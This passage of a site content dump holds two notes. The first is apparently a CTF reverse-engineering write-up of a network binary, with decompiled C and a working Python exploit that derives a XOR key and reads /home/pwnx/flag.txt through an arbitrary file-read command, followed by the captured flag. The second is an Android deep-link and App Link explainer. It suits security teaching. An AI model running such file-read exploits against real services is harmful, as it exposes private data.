}\n\tlocal_148 = 0;\n  if (local_154 == 0x42) {\n\tuVar5 = may_log(\u0026DAT_005cacc0,\"EXEC_WRITE Not implemented\");\n\tjmp_rsi(uVar5,FUN_00476340);\n  }\n  else if (local_154 \u003c 0x43) {\n\tif (local_154 == 0x40) {\n\t  obj-\u003esize = 1;\n\t  cVar2 = FUN_00405355(char_ptr_array[1]);\n\t  if (cVar2 == '\\x01') {\n\t\tobj-\u003eundefined_3 = 1;\n\t  }\n\t  else {\n\t\tobj-\u003eundefined_3 = 0;\n\t  }\n\t}\n\telse if (local_154 == 0x41) {\n\t  if (at_least_2 == 3) {\n\t\tlocal_148 = FUN_004ce310(char_ptr_array[2]);\n\t\tlocal_144 = FUN_004053be(\u0026obj-\u003eundefined_3,char_ptr_array[1],local_148);\n\t\tif (local_144 == 0) {\n\t\t  obj-\u003esize = 0;\n\t\t}\n\t\telse {\n\t\t  obj-\u003esize = (uint16_t)local_144;\n\t\t  for (local_150 = 0; local_150 \u003c local_144; local_150 = local_150 + 1) {\n\t\t\tobj-\u003epayload[(long)local_150 + -2] =\n\t\t\t\t obj-\u003epayload[(long)local_150 + -2] ^ stored_value;\n\t\t  }\n\t\t}\n\t  }\n\t  else {\n\t\tobj-\u003esize = 0;\n\t  }\n\t}\n  }\n```\n\nIf `at_least_2` is, *at least* (:}), 2 we have multiple conditional statements on the first retrieved string (at index 0) of `char_ptr_array`. The function `thunk_FUN_004ef8a0` accepts a constant (they all reside inside the `.rodata` section) as the second parameter and the mentioned string as the first. The tree constants are (two of them needs to be converted manually from ghidra into a `string`): stat, read and write. Based on the return value of `iVar3` we are setting `local_154` to `0x40`, `0x41` or `0x42` that are later used inside multiple `if` statements. \n\nIf `local_154` is `0x42`, our previously renamed `may_log` function writes `\"EXEC_WRITE Not implemented\"` and the same for on `0x40` and `0x41` (like a classic `switch` statement) but with the difference that we do not have the `Not implemented` log message. Following the logic of this log function, we can suppose that `EXEC_WRITE` is the source code representation of a command that can be set from the `thunk_FUN_004ef8a0` call with the `write` as a second parameter (since it sets the variable to `0x42`). We can rename `local_154` to `exec_command`.\n\nIf `exec_command` is `0x40` there is a call to `FUN_00405355` that seems to return something similar to a boolean result. If the return result is `0x1`, `obj-\u003eundefined4` is set accordingly and the same for `0x0`.\n\n#### stat - `FUN_00405355`\n```C\nbool FUN_00405355(undefined8 param_1)\n\n{\n  int iVar1;\n  long in_FS_OFFSET;\n  undefined local_a8 [152];\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  iVar1 = FUN_00522440(param_1,local_a8);\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_check();\n  }\n  return iVar1 == 0;\n}\n\n```\n\nThis function is really simple since it just calls one function and returns its value (ignore the `local_10` that is the stack cookie). The called function `FUN_00522440` is the statically linked `stat` function since it clearly calls a syscall with the `EAX` register set to `0x106`(`newfstatat` syscall). The return result of `stat` (and subsequently of `FUN_00405355`) indicates if the file exists or not. We can rename that function to `exec_stat`.\n\n#### read - `FUN_004ce310` \u0026 `FUN_004053be`\nIf the `exec_command` inside `command_0x20` matches `0x41`, the first check is that `at_least_2` is equals to 3 and if it is not we return with `obj-\u003esize` set to zero. Otherwise, we call `FUN_004ce310` with `char_ptr_array[2]` as parameter and the result will be the third parameter of `FUN_004053be` (marked as `int` in the function signature from ghidra). That parameter is later used inside the function `FUN_00522080` that is an `lseek` syscall. The second parameter of `lseek` is an `off_t` (`long int`) type, meaning that ghidra \"guessed\" it pretty correctly.  For that reasons, it seems that from the second index of `char_ptr_array` we are retrieving, in some way, an integer value that we are passing to `FUN_004053be` and using it as an offset to something through `lseek`.\n\n```C\nint FUN_004053be(long param_1,undefined8 param_2,int param_3)\n{\n  int iVar1;\n  long lVar2;\n  \n  iVar1 = FUN_005220d0(param_2,0);\n  if (iVar1 == -1) {\n    iVar1 = 0;\n  }\n  else {\n    lVar2 = lseek(iVar1,(long)param_3,0);\n    if (lVar2 == -1) {\n      iVar1 = 0;\n    }\n    else {\n      iVar1 = FUN_005223a0(iVar1,param_1,0xff);\n      *(undefined *)(param_1 + iVar1) = 0;\n    }\n  }\n  return iVar1;\n}\n```\n\nFunction `FUN_004053be` is called with `obj-\u003eundefined_3` as the first parameter and `char_ptr`array as the second one. \n\n`FUN_005220d0` is a call to the `openat` syscall, meaning that we are opening the file at `param_2` as read-only. Let's rename it into `filename` and retype to `char*`. If `openat` succeeds, `lseek` is called with the offset specified by `param_3` (renamed to `offset`) on the opened file handle. It then proceeds to call `FUN_005223a0` (\"proxy\" function to the `read` syscall) with the `param_1` (that is `obj-\u003eundefined3`) as the `char* buf` parameter.  That means that inside `obj-\u003eundefined3` there is the content of the read file at the specified offset.\nThis the cleaned code:\n```C\nint exec_open(long param_1,char *filename,int offset)\n{\n  int fp;\n  long lVar1;\n  \n  fp = openat(filename,0);\n  if (fp == -1) {\n    fp = 0;\n  }\n  else {\n    lVar1 = lseek(fp,(long)offset,0);\n    if (lVar1 == -1) {\n      fp = 0;\n    }\n    else {\n      fp = read(fp,param_1,0xff);\n      *(undefined *)(param_1 + fp) = 0;\n    }\n  }\n  return fp;\n}\n```\n\nThe return result is the `read` return value (number of read bytes) and the value, at `command_0x20` function, is stored inside `obj-\u003esize`. It follows a `for` loop that XOR each character inside the `obj-\u003epayload` with the previously retrieved `stored_value`.  However, we can see a strange array access: `obj-\u003epayload[(long)local_150 + -2]`. `local_150`, the `for` loop index initialized with zero,  is used to access `-2` bytes before the array memory location? What a strange behavior.. or, maybe, we have made wrong assumptions before. Maybe the array starts 2 bytes before?\n\nLet's re-think a little bit by re-watching our current struct definition:\n\n![[notes/images/rev/4.png]]\n\n`payload[-2]` indicates `undefined_3`. We have set it due to the usage and the retrieval of a specific size in the offset of `calculated_size` and we still didn't know the value of the byte before (=\u003e`undefined_3`) but:\n- Arguments (for example to the identified `exec_open` function) are dynamically generated into a local array (`char_ptr_array`) so the payload stores both the size (that is sanitized) and the content.\n- `undefined_3` is used as the direct buffer output of the `read` syscall.\n- The `for` loop starts the xoring operation two indexes before the current definition (`-2`).\n\nFor that reasons, let's try to remove `undefined_3` and `calculated_size` by replacing them with two extra bytes for `payload` instead:\n\n![[notes/images/rev/5.png]]\n\nWith that change, the code seems far more congruent and readable.\n\n### Chain all pieces\nAfter this intensive Reverse Engineering phase, we have recovered a much more understandable code (that you can find at the end [[#Appendix Cleaned code]]) with ideas on how the program works:\n- The client message must contain a well-defined structure with a constant value at the beginning, a command and the size of the entire message.\n- The command `0x10` sets a value that can be retrieved from the command `0x20`. This value is later used to XOR the content of the message like a basic encryption mechanism.\n- The command `0x20`, after few validation checks, parses an array of arguments dynamically and is able to execute few extra operations: read, write and stat.\n- The write operation is not implemented, while the stat is able to identify existing files and the read operation to read arbitrary files.\n- The read operation, from the command `0x20`, can be exploited in order to read the flag at `/home/pwnx/flag.txt` (as instructed in the webroot at port 80).\n\nTo solve the challenge, it is necessary to initializes a session that returns a xoring key. The retrieved key is used to \"encrypt\" a further message that contains a read operation to the `/home/pwnx/flag.txt` file.  The final python exploit can be found [here TODO](TODO).\n\n## libc signature resolution alternative\nAn alternative solution to retrieve function signatures for statically linked libc functions is to use something like [IDA FLIRT](https://docs.hex-rays.com/user-guide/signatures/flirt) or its [Ghidra ApplySig](https://github.com/NWMonster/ApplySig) alternative. This approach is well explained from Liveoverflow in the following video: [Reversing Statically-Linked Binaries with Function Signatures](https://www.youtube.com/watch?v=CgGha_zLqlo).\n## Conclusion\nHope you have enjoyed this RE journey. In the next blog post we are going to release the write-up for the binary exploitation challenge too that involves a custom allocator specifically written for that challenge! Stay tuned and happy hacking!\n\n## Appendix\n### The cleaned code\n```C\nvoid parse_client_message(int socket)\n\n{\n  long lVar1;\n  char res;\n  int bytes_received;\n  undefined8 uVar2;\n  long in_FS_OFFSET;\n  struct custom_message undefined_obj;\n  char buffer [264];\n  \n  lVar1 = *(long *)(in_FS_OFFSET + 0x28);\n  thunk_FUN_004ef5e0(buffer,0,0x108);\n  bytes_received = recvfrom(socket,buffer,0x108,0);\n  if (bytes_received \u003c 0) {\n    uVar2 = may_log(\u0026DAT_005caba0,\"Error reading from socket\");\n    jmp_rsi(uVar2,FUN_00476340);\n    close(socket);\n  }\n  else {\n    init_obj(\u0026undefined_obj);\n    res = copy_from_buffer(\u0026undefined_obj,buffer,(long)bytes_received);\n    if (res == '\\x01') {\n      FUN_00406018(\u0026undefined_obj);\n      if (undefined_obj.command == 0x10) {\n        command_0x10(\u0026undefined_obj);\n      }\n      else if (undefined_obj.command == 0x20) {\n        command_0x20(\u0026undefined_obj);\n      }\n      else {\n        undefined_obj.size = 0;\n      }\n      sendto(socket,\u0026undefined_obj,(ulong)undefined_obj.size + 8,0);\n    }\n    else {\n      uVar2 = may_log(\u0026DAT_005caba0,\"Invalid message received\");\n      jmp_rsi(uVar2,FUN_00476340);\n    }\n  }\n  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_check();\n  }\n  return;\n}\n\nvoid command_0x10(struct custom_message *obj)\n\n{\n  int iVar1;\n  ushort *puVar2;\n  byte bVar3;\n  long in_FS_OFFSET;\n  ushort obj_undefined;\n  long stack_cookie;\n  \n  stack_cookie = *(long *)(in_FS_OFFSET + 0x28);\n  obj_undefined = *(ushort *)obj-\u003exor_key_derivate;\n  if ((obj_undefined \u003c 0x100) || (0x900 \u003c obj_undefined)) {\n    obj-\u003esize = 0;\n  }\n  else {\n    iVar1 = return_something();\n    bVar3 = (char)iVar1 + (char)(iVar1 / 0x3f) * -0x3f;\n    puVar2 = (ushort *)store_and_get(\u0026DAT_005c9d80,\u0026obj_undefined);\n    *puVar2 = (ushort)bVar3;\n    obj-\u003esize = 2;\n    obj-\u003epayload[0] = 0x1;\n    obj-\u003epayload[1] = bVar3;\n  }\n  if (stack_cookie != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_check();\n  }\n  return;\n}\n\n\nvoid command_0x20(struct custom_message *obj)\n\n{\n  long lVar1;\n  byte stored_value;\n  char cVar2;\n  int iVar3;\n  undefined2 *puVar4;\n  undefined8 uVar5;\n  long in_FS_OFFSET;\n  undefined2 local_168;\n  ushort memcpy_size;\n  int memcpy_source_offset;\n  int at_least_2;\n  int idx;\n  int inner_idx;\n  int exec_command;\n  int local_150;\n  undefined4 local_14c;\n  undefined4 local_148;\n  int n_bytes;\n  char *memcpy_dest;\n  char *char_ptr_array [16];\n  \n  lVar1 = *(long *)(in_FS_OFFSET + 0x28);\n  local_168 = *(undefined2 *)obj-\u003exor_key_derivate;\n  puVar4 = (undefined2 *)store_and_get(\u0026DAT_005c9d80,\u0026local_168);\n  stored_value = (byte)*puVar4;\n  if (stored_value == 0) {\n    obj-\u003esize = 0;\n  }\n  else {\n    local_14c = 3;\n    char_ptr_array[0] = (char *)0x0;\n    char_ptr_array[1] = (char *)0x0;\n    char_ptr_array[2] = (char *)0x0;\n    memcpy_size = 0;\n    memcpy_source_offset = 0;\n    memcpy_dest = (char *)0x0;\n    at_least_2 = 0;\n    idx = 0;\n    while ((((idx \u003c 3 \u0026\u0026\n             (memcpy_size = (ushort)obj-\u003epayload[memcpy_source_offset],\n             (int)(uint)memcpy_size \u003c= 0xff - memcpy_source_offset)) \u0026\u0026 (memcpy_size \u003c obj-\u003esize))\n           \u0026\u0026 (memcpy_size != 0))) {\n      memcpy_dest = (char *)malloc(memcpy_size + 1);\n      memcpy_dest[memcpy_size] = '\\0';\n      memcpy(memcpy_dest,obj-\u003epayload + (long)memcpy_source_offset + 1,memcpy_size);\n      for (inner_idx = 0; inner_idx \u003c (int)(uint)memcpy_size; inner_idx = inner_idx + 1) {\n        memcpy_dest[inner_idx] = memcpy_dest[inner_idx] ^ stored_value;\n      }\n      char_ptr_array[idx] = memcpy_dest;\n      at_least_2 = at_least_2 + 1;\n      memcpy_source_offset = memcpy_source_offset + memcpy_size + 1;\n      idx = idx + 1;\n    }\n    if (at_least_2 \u003c 2) {\n      obj-\u003esize = 0;\n    }\n    else {\n      exec_command = 0;\n      iVar3 = what_is_this(char_ptr_array[0],\"stat\");\n      if (iVar3 == 0) {\n        exec_command = 0x40;\n      }\n      iVar3 = what_is_this(char_ptr_array[0],\"read\");\n      if (iVar3 == 0) {\n        exec_command = 0x41;\n      }\n      iVar3 = what_is_this(char_ptr_array[0],\"write\");\n      if (iVar3 == 0) {\n        exec_command = 0x42;\n      }\n      local_148 = 0;\n      if (exec_command == 0x42) {\n        uVar5 = may_log(\u0026DAT_005cacc0,\"EXEC_WRITE Not implemented\");\n        jmp_rsi(uVar5,FUN_00476340);\n      }\n      else if (exec_command \u003c 0x43) {\n        if (exec_command == 0x40) {\n          obj-\u003esize = 1;\n          cVar2 = exec_stat(char_ptr_array[1]);\n          if (cVar2 == 0x1) {\n            obj-\u003epayload[0] = '\\x01';\n          }\n          else {\n            obj-\u003epayload[0] = '\\0';\n          }\n        }\n        else if (exec_command == 0x41) {\n          if (at_least_2 == 3) {\n            local_148 = FUN_004ce310(char_ptr_array[2]);\n            n_bytes = exec_open(obj-\u003epayload,char_ptr_array[1],local_148);\n            if (n_bytes == 0) {\n              obj-\u003esize = 0;\n            }\n            else {\n              obj-\u003esize = (uint16_t)n_bytes;\n              for (local_150 = 0; local_150 \u003c n_bytes; local_150 = local_150 + 1) {\n                obj-\u003epayload[local_150] = obj-\u003epayload[local_150] ^ stored_value;\n              }\n            }\n          }\n          else {\n            obj-\u003esize = 0;\n          }\n        }\n      }\n    }\n  }\n  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {\n    return;\n  }\n                    /* WARNING: Subroutine does not return */\n  __stack_check();\n}\n\n\nbool exec_stat(undefined8 param_1)\n\n{\n  int ret;\n  long in_FS_OFFSET;\n  undefined local_a8 [152];\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  ret = stat(param_1,local_a8);\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_check();\n  }\n  return ret == 0;\n}\n\nint exec_open(long param_1,char *filename,int offset)\n\n{\n  int fp;\n  long lVar1;\n  \n  fp = openat(filename,0);\n  if (fp == -1) {\n    fp = 0;\n  }\n  else {\n    lVar1 = lseek(fp,(long)offset,0);\n    if (lVar1 == -1) {\n      fp = 0;\n    }\n    else {\n      fp = read(fp,param_1,0xff);\n      *(undefined *)(param_1 + fp) = 0;\n    }\n  }\n  return fp;\n}\n```\n\n### Exploit\n```python\nfrom struct import *\nimport socket\nimport sys\nimport hashlib\nfrom termcolor import colored\n\ndef print_info(str):\n    print(colored(\"[*] \" + str,\"cyan\"))\ndef print_ok(str):\n    print(colored(\"[+] \"+ str,\"green\"))\ndef print_error(str):\n    print(colored(\"[-] \"+ str,\"red\"))\ndef print_warning(str):\n    print(colored(\"[!!] \" + str,\"yellow\"))\n\nchar = \"x\"\nsigned_char = s_char = \"b\"\nunsigned_char = u_char = \"B\"\n_Bool = _bool = \"?\"\nshort_int = s_int = \"h\"\nunsigned_short_int = u_s_int = \"H\"\n_int = \"i\"\nunsigned_int = u_int = \"I\"\nlong_int = l_int = \"l\"\nunsigned_long_int = u_l_int = \"L\"\nlong_long_int = l_l_int = \"q\"\nunsigned_long_long_int = u_l_l_int = \"Q\"\n_float = \"f\"\n_double = \"d\"\nchar_array = \"s\"\nvoid = \"P\"\n\ndef get_byte(num):\n    return pack(\"\u003cB\", num)\n\ndef get_word(num):\n    return pack(\"\u003cH\", num)\n\ndef get_dword(num):\n    return pack(\"\u003cL\", num)\n\ndef get_qword(num):\n    return pack(\"\u003cQ\", num)\n\ndef eazy_unpack(format_list, data):\n    # THe first one must be little/big endian ot newtork or what else\n    # Give back struct format from a list\n    form = \"\"\n    print(\"[eazy_struct] size of data: \" + str(len(data)))\n    for ff in format_list:\n        form += ff \n    \n    try:\n        res = unpack(form, data)\n        return list(res)\n    except Exception as ez:\n        print(\"Exception generated: \" + str(ez))\n        return -1\n\nclass Packet():\n    def __init__(self):\n        self.header = Header()\n    def get(self):\n        # Get the packet in bytes to send\n        final_packet = bytearray()\n        # Put the header inside the packet\n        for item in vars(self.header):\n            item_value = getattr(self.header, item)\n            if item_value is None:\n                print_warning(\"[Packet.get] Item \" + item + \" is None\")\n                return -1\n            final_packet += item_value\n        # Put the body inside the packet\n        \"\"\"\"\n        for item in vars(self.body):\n            item_value = getattr(self.body, item)\n            if item_value is None:\n                print_warning(\"[Packet.get] Item \" + item + \" is None\")\n                return -1\n            final_packet += item_value\n        \"\"\"\n        return final_packet\n\n# Define packet structure below\nclass Header:\n    def __init__(self):\n        self.magic_value = None\n        self.session_id = None\n        self.command = None\n        self.unused = None\n        self.body_size = None\n        self.body_args = None\n\ndef send_packet_hello(sock):\n    p = Packet()\n\n    p.header.magic_value    = get_word(0xff66)\n    p.header.session_id     = get_word(0x101)\n    p.header.command        = get_byte(0x10)\n    p.header.unused         = get_byte(0x44)\n    p.header.body_size      = get_word(200)\n    p.header.body_args      = bytearray([0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41])\n    \n    packet = p.get()\n\n    ff = open(\"/tmp/req1\",\"wb\")\n    ff.write(packet)\n    ff.close()\n\n    print(\"[*] Sending ..\")\n    sock.send(packet)\n    print(\"[*] Receiving ..\")\n    res = sock.recv(0x100)\n\n    ff = open(\"/tmp/res1\",\"wb\")\n    ff.write(res)\n    ff.close()\n    \n    # retrieve the encryption key\n    enc_key = res[9]\n    return enc_key\n\ndef encrypt_string(string, enc_key):\n    xor_result = ''.join(chr(ord(char) ^ enc_key) for char in string)\n    return xor_result\n\ndef decrypt_string(string_bytes, enc_key):\n    res = \"\"\n    for v_byte in string_bytes:\n        res += chr(v_byte ^ enc_key)\n\n    return res\n\ndef send_packet_exec(sock, enc_key):\n    p = Packet()\n\n    p.header.magic_value    = get_word(0xff66)\n    p.header.session_id     = get_word(0x101)\n    p.header.command        = get_byte(0x20)\n    p.header.unused         = get_byte(0x01)\n\n    # Create the encrypted arguments body\n    pp                      = \"read\"\n    payload                 = chr(len(pp))\n    payload                 += encrypt_string(pp, enc_key)\n\n    pp                      = \"/home/pwnx/flag.txt\"\n    payload                 += chr(len(pp))\n    payload                 += encrypt_string(pp, enc_key)\n\n    pp                      = \"0\"\n    payload                 += chr(len(pp))\n    payload                 += encrypt_string(pp, enc_key)\n\n    encrypted_body          = bytearray(payload.encode(\"utf-8\"))\n    p.header.body_size      = get_word(len(encrypted_body))\n    p.header.body_args      = encrypted_body\n    \n    packet = p.get()\n\n    ff = open(\"/tmp/req2\",\"wb\")\n    ff.write(packet)\n    ff.close()\n\n    sock.send(packet)\n    res = sock.recv(0x100)\n    file_content = decrypt_string(res[8:], enc_key)\n    print(\"[*] File content: \" + file_content)\n\n    ff = open(\"/tmp/res2\",\"wb\")\n    ff.write(res)\n    ff.close()\n\nif __name__ == \"__main__\":\n    if len(sys.argv) \u003c 2:\n        print_error(\"Needed parameters\")\n        sys.exit()\n\n    target = sys.argv[1]\n    port = int(sys.argv[2])\n\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((target,port))\n\n    enc_key = send_packet_hello(sock)\n    print(\"[+] Encryption key found: \" + hex(enc_key))\n    # reconnect\n    sock.close()\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((target,port))\n    send_packet_exec(sock, enc_key)\n\n```\n\nResult:\n```bash\n$ python3 exploit.py \u003cip\u003e \u003cport\u003e\n[*] Sending ..\n[*] Receiving ..\n[+] Encryption key found: 0x2e\n[*] File content: PWNX{67ef535c2d1a5eea75b21091bd5d2e18eedf9f5c5abd61aa73b0110522666ab3}\n```","lastmodified":"2025-04-14T14:14:33.954126369Z","tags":null},"/notes/Android-Deep-Dive-Deep-and-App-Linking":{"title":"Android Deep Dive - Deep and App Linking","content":"\n## Introduction\nIn the [previous blog post](https://1day.dev/notes/Android-Deep-Dive-Implicit-Intents/) we have covered some internal parts of the codebase that are involved in the intent registration and resolution process. In this one we are going to deepen Deep and App Link resolutions in the Android Operating System and its remote Attack Surface. Deep and App Links are data components that permit to associate a specific link to a specific app component. In order to further detail their usage across the Android system, let's start with a Deep Link introduction.\n## Deep Link\nSuppose that you are an app developer and you want to make some of your android app components reachable from an external source (e.g. a browser or another application), and you want an \"universal\" and standard solution: that's where Deep Links come in place! For example, you can have a link like `privateapp://app/login?username=user` that can be called anywhere (almost) and leads to your application execution logic. Moreover, you have a standard approach that you can use to register an arbitrary schema, host and path and you can also pass and receive parameters like a classic web URL. Deep Links are declared in the `AndroidManifest.xml` application file with an `\u003cintent-filter\u003e` declaration inside the targeted component (that can be an activity, service, receiver or provider). The following declaration can match the previously mentioned example:\n\n```xml\n\u003cactivity android:name=\".TargetLoginActivity\"\u003e\n\t\u003cintent-filter\u003e\n\t\t\u003caction android:name=\"android.intent.action.VIEW\"\u003e\n\t\t\u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n\t\t\u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n\t\t\u003cdata android:scheme=\"privateapp\"/\u003e\n\t\t\u003cdata android:host=\"app\"/\u003e\n\t\t\u003cdata android:path=\"login\"/\u003e\n\t\u003c/intent-filter\u003e\n\u003c/activity\u003e\n```\n\nAs can be seen the `android:scheme`, `android:host` and `android:path` attributes (more attributes can be found in the [documentation](https://developer.android.com/guide/topics/manifest/data-element)) of the `\u003cdata\u003e` tag are used to register the specific URI to handle. Another common approach is to use a single `\u003cdata\u003e` tag, but seems discouraged from the official documentation:\n```xml\n\u003cactivity android:name=\".TargetLoginActivity\"\u003e\n\t\u003cintent-filter\u003e\n\t\t\u003caction android:name=\"android.intent.action.VIEW\"\u003e\n\t\t\u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n\t\t\u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n\t\t\u003cdata android:scheme=\"privateapp\"\n\t\t\tandroid:host=\"app\"\n\t\t\tandroid:path=\"login\"/\u003e\n\t\u003c/intent-filter\u003e\n\u003c/activity\u003e\n```\n\nThe internal classification, as explained in the previous blog post, is of type `Schemes` but can also contains some MIME types and fall inside other categorizations too (that can be enumerated with `dumpsys package`).\n\n### Actions and Categories\nAn important aspect of a Deep Link reachability is the declared actions and categories. Not all deep links are intended to be reachable from anywhere but an interesting behaviour is that the link can dropped \"anywhere\" (e.g. in a browser inside the `\u003ca\u003e` element) and a click into it will results into an **implicit intent** sent from the browser to the android system, that will take care of the resolution to the appropriate destination (as explained in the first article). For that reason, actions and categories have a fundamental role:\n- [`ACTION_VIEW`](https://developer.android.com/reference/android/content/Intent#ACTION_VIEW): The VIEW action is the default action that is sent if a link is clicked from an `\u003ca\u003e` element or a button from web page. It is useful to be specified inside the `intent-filter` declaration if the intention is to reach the link from a simple click.\n- [`CATEGORY_BROWSABLE`](https://developer.android.com/reference/android/content/Intent#CATEGORY_BROWSABLE): The BROWSABLE category is necessary to reach the intent from a web browser (e.g. chrome). When a browser interacts with the `ActivityManager` system service, it asks for the resolution of the desired deep link by also specifying the required `CATEGORY_BROWSABLE` category in the requested `intent` parameter (the second parameter of the `IntentResolver::queryIntent` method). If the targeted intent filter does not match that category, the resolution fails and never happen.\n- [`CATEGORY_DEFAULT`](https://developer.android.com/reference/android/content/Intent#CATEGORY_DEFAULT): The DEFAULT category is necessary to the application to respond to implicit intents, as specified in the [documentation](https://developer.android.com/training/app-links/deep-linking).\n\nWhile `BROWSABLE` and `DEFAULT` are mandatory for the implicit resolution process, the action is not that strictly necessary. The default `VIEW` action is meant for direct link access (e.g. `privateapp://app/login?username=user` inside an `\u003ca\u003e` element) but it's also possible to use the `intent://` approach.\n\n### `intent://` and `parse_uri`\nBrowsers with android support (e.g. google chrome) can use a special syntax: `intent://`. This syntax, that can be used in a web page as a normal link, permits to launch android app components (that match the `BROWSABLE` and `DEFAULT` categories) directly from a web browser, just like a simpler direct deep link. The [chrome documentation](https://developer.chrome.com/docs/android/intents) details it and uses the following as an URI template:\n```java\nintent:  \n   HOST/URI-path // Optional host  \n   #Intent;  \n      package=\\[string\\];  \n      action=\\[string\\];  \n      category=\\[string\\];  \n      component=\\[string\\];  \n      scheme=\\[string\\];  \n   end;\n```\n\nFor example, the previous `privateapp://app/login?username=user` can be `intent://app/login#Intent;scheme=privateapp;end` and perform the same operation. However, one of the main difference is the required action. While a direct deep link requires the target component to have the `ACTION_VIEW` declared and can only trigger that action, the `intent://` scheme permits to call arbitrary actions based on the `action` parameter. For example, the intent `intent://app/login#Intent;scheme=privateapp;action=android.action.ARBITRARY_ACT;end` launches the same intent but with the action `android.action.ARBITRARY_ACT` instead of the default VIEW one. The logic behind this intent creation from an URI can be found in the [`Intent::parseUri`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/core/java/android/content/Intent.java;l=7921) method and, as can be seen from the source code, it is possible to specify different options like categories, target package name, extras, data and so on.\n\n## App Link\nApp Links are the same as Deep Links but with a major difference: they are associated with a domain. Instead of the `privateapp://app/login?username=user` we can have `https://mypersonal.website.com/login?username=user` that is entirely the same as a classic URL that can be navigated from a web browser but, if the application is installed and the intent filter registered, it permits to continue the navigation to the mobile application, with a better user experience from a mobile point of view. So, an App Link declaration can looks like this:\n```xml\n\u003cactivity android:name=\".TargetLoginActivity\"\u003e\n\t\u003cintent-filter autoVerify=\"true\"\u003e\n\t\t\u003caction android:name=\"android.intent.action.VIEW\"\u003e\n\t\t\u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n\t\t\u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n\t\t\u003cdata android:scheme=\"https\"/\u003e\n\t\t\u003cdata android:host=\"mypersonal.website.com\"/\u003e\n\t\t\u003cdata android:path=\"login\"/\u003e\n\t\u003c/intent-filter\u003e\n\u003c/activity\u003e\n```\n\nSimilar to the previously described deep link but with one crucial difference: the `android:scheme` is either `http` or `https`. In order to associate a specific application to an arbitrary domain, a verification through the [Digital Asset Links](https://developers.google.com/digital-asset-links) is required. Without this verification, the App Link is not trusted and it is not possible to use it. An `assetlinks.json` must be created for that purpose in the target domain, as well explained in the [Verify Android App Links](https://developer.android.com/training/app-links/verify-android-applinks) documentation. For debugging purposes, it is possible to verify App Links through `adb shell pm set-app-links --package com.app.example 1 all` and verify its validation with `adb shell pm get-app-links com.app.example` (the constant should be `1` to be verified).\n\n## Browser perspective\nFrom a browser perspective (e.g. chrome in this overview), intents delivered through deep and app links are requested to a preliminary call to the IPC method `queryIntentActivities` of the `PackageManager` service. If an intent matches, with all requested attributes and the `BROWSABLE` category, the intent is delivered  using `startActivity` from the `ActivityTaskManager` system service. Since the intent matching is performed with `queryIntentActivities`, resolved components can be only activities.\n\n## Linkify\nAn interesting android class related to Deep and App Links is [`Linkify`](https://developer.android.com/reference/android/text/util/Linkify): it uses regular expressions to transform a piece of text into clickable links.\n\n```java\ntextView.setText(\"Contat us at info@mail.com or call +1234567890\");\nLinkify.addLinks(textView, Linkify.EMAIL_ADDRESSES | Linkify.PHONE_NUMBERS);\n```\n\nThe \"linkified\" version of the provided text will generates two clickable links: the e-mail and the phone number. They are both replaced with the system deep link default handler (e.g. `mailto://` and `tel:` for the phone number) in order to send an implicit intent with that scheme. It is possible, in Android 14, to linkify web urls, e-mail addresses, phone numbers and map addresses. The Linkify code is at [`Linkify.java`](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/text/util/Linkify.java;l=99;drc=a78d762ccdbcb1f8f40f2c860caca75ade5d486b) file and represent an interesting behaviour that can be used and abused from third-party apps (e.g. messaging apps).\n\n## Fragment Deeplinks\nFragments are commonly used as portions in the Android UI and can be linked to Deep and App Links also if they cannot be exported as normal components. The process of creating a deep link for a fragment is described in the [Android documentation](https://developer.android.com/guide/navigation/design/deep-link) and the main logic is that a \"fragment navigation\" resource XML file is created and linked to a specific activity through the `\u003cnav-graph\u003e` element:\n```xml\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\n\u003cmanifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    package=\"com.example.myapplication\"\u003e\n    \u003capplication ... \u003e\n        \u003cactivity name=\".MainActivity\" ...\u003e\n            \u003cnav-graph android:value=\"res/nav_graph.xml\" /\u003e\n        \u003c/activity\u003e\n    \u003c/application\u003e\n\u003c/manifest\u003e\n```\n\nThe `res/nav_graph.xml` contains a Deep Link declaration that is tied to a specific fragment and follows the usual Deep and App link declaration style:\n```xml\n\u003cfragment android:id=\"@+id/a\"\n          android:name=\"com.example.myapplication.FragmentA\"\n          tools:layout=\"@layout/a\"\u003e\n        \u003cdeepLink app:uri=\"www.example.com\"\n                app:action=\"android.intent.action.MY_ACTION\"\n                app:mimeType=\"type/subtype\"/\u003e\n\u003c/fragment\u003e\n```\n\nHowever, they key part is that the `\u003cdeepLink\u003e` element, at build time, is transformed into a classic `\u003cintent-filter\u003e` of the activity that holds the `\u003cnav-graph\u003e` declaration (with the appropriate action and categories). That means that, when the application is compiled, the `\u003cintent-filter\u003e` declaration is the same of a \"classic\" one.\n\n## Conclusion\nIn this two part series we have covered intent implicit resolution, deep linking and the browser perspective. While assessing the Attack Surface of an Android mobile application, it is crucial to have a solid understanding of these key internal concepts and components.\n\n## References\n- https://developer.android.com/guide/topics/manifest/data-element\n- https://developer.android.com/training/app-links/deep-linking\n- https://developer.chrome.com/docs/android/intents\n- 